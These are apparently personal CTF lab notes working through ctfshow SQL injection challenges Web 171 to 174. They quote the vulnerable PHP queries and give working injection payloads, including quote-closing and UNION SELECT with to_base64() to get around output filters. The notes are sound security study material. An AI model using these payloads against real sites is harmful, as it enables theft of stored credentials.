# Web 171
![[Pasted image 20241214102338.png]]
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";
```

```SQL
select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;
```
## Observation
PHP code is : `$sql = "xxxxx".$_GET['id']."yyyy"`
- `xxxxx`: `select username,password from user where username !='flag' and id = '`
- `yyyy`: `' limit 1; `
When we do search in this page:
- If username is not flag, and the user ID is not what we provide, the records will be displayed.
- Limit will be executed at last.
## Research

This is a typical ==string== **SQL Injection**.
- Try to use `'` to match the `'` in the string before `$_GET['id']`, so we use `{number}'`.
- Then we also need to match the `'` in the string after `$_GET['id']`, so we use `or username = 'flag`
## Experiment
![[Pasted image 20241216201104.png]]

**Why `limit 1` is invalid?** 
Guess:
- 在分布式数据库（如某些 MySQL 集群版本）中，`LIMIT` 的应用可能被推迟到查询的最终合并阶段，导致在本地节点看到多条记录。
- 某些数据库引擎（如 MySQL）可能会因为缓存问题返回过多的记录。这种情况在高并发查询时容易发生。

# Web 172
![[Pasted image 20241218062030.png]]
Use the same trick, the password says: `flag_not_here`.
![[Pasted image 20241218062133.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
But the returning logic:
```PHP
//检查结果是否有flag
if($row->username!=='flag'){
  $ret['msg']='查询成功';
}
```
This filters the record whose username is "flag".
## Research
So we need to avoid this filter by using Base64 coding.
### `TO_BASE64()` Method in MySQL
In the standard SQL, there is no Base64 encoding method.
However, there is `TO_BASE64()` method in MySQL and `encode()` in PostgreSQL.
### UNION SQL Injection
When in string SQL injection point, we also can use UNION method.
- Close the `'` before;
- then follow a new `SELECT` with `UNION`.
## Experiment
use:
```SQL
1' union select to_base64(username), to_base64(password) from ctfshow_user2 where username = 'flag' -- 
```
![[Pasted image 20241218063217.png]]
We can decode the password.

![[Pasted image 20241218064420.png]]

## Another Way
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select username, password from ctfshow_user2 where username = 'flag' limit 1;
```
to
```SQL
select username, password from ctfshow_user2 where username != 'flag' and id = '9999' union select id, password from ctfshow_user2 where username = 'flag' limit 1;
```

Change username to ID, so that avoiding the condition.

![[Pasted image 20241219064028.png]]
# Web 173
![[Pasted image 20241219064644.png]]
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user3 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The condition of returning is:
```PHP
//检查结果是否有flag
if(!preg_match('/flag/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Analysis
If we don't show the username in the returning record, the condition can be avoided.
[[#Another Way]]
```SQL
select id, username, password from ctfshow_user3 where username != 'flag' and id = '999' union select id, id, password from ctfshow_user3 where username = 'flag' limit 1;
```
## Experiment
Local Test:
![[Pasted image 20241219065519.png]]
The real test:
![[Pasted image 20241219065623.png]]

# Web 174
## Observation
```PHP
//拼接sql语句查找指定ID用户
$sql = "select id,username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";
```
The SQL in it is:
```SQL
select id, username, password from ctfshow_user2 where username != 'flag' and id = '???' limit 1;
```
 Condition:
```PHP
//检查结果是否有flag
if(!preg_match('/flag/i', json_encode($ret))){
  $ret['msg']='查询成功';
}
```
## Research
在PHP中，`json_encode()`函数的主要作用是将PHP变量转换为JSON格式的字符串，以下是具体介绍： 
### 数据序列化
将PHP中的各种数据类型，如数组、对象、字符串、数字、布尔值等转换为JSON格式的字符串，以便在不同的系统或应用之间进行数据传输或存储。例如： 
```php
$data = array('name' => 'John', 'age' => 30, 'city' => 'New York'); $jsonData = json_encode($data); echo $jsonData; 
``` 上述代码将一个关联数组转换为JSON字符串 `{"name":"John","age":"30","city":"New York"}`，方便数据在网络中传输或存储到文件等。 
### 与JavaScript交互
由于JSON是JavaScript中处理数据的常用格式，`json_encode()`函数使得PHP能够方便地与JavaScript进行数据交互。比如，在PHP中生成数据，然后通过`json_encode()`转换为JSON格式，再传递给JavaScript进行处理。 ```php <?php $data = array('message' => 'Hello from PHP!'); $jsonData = json_encode($data); ?> <script> var data = <?php echo $jsonData;?>; console.log(data.message); </script> ``` 
### API开发
在开发Web API时，通常需要将数据以JSON格式返回给客户端。`json_encode()`函数可以将PHP中的数据处理结果转换为JSON格式，方便客户端进行解析和使用。 
### 数据存储
可以将JSON格式的字符串存储到数据库或文件中，以便后续读取和使用。当需要从数据库或文件中获取数据时，再使用相应的函数将JSON字符串转换回PHP数据类型进行处理。 ### 配置文件处理
有时配置文件会使用JSON格式来存储数据，`json_encode()`函数可以将PHP中的配置数据转换为JSON格式并写入配置文件，方便管理和修改配置信息。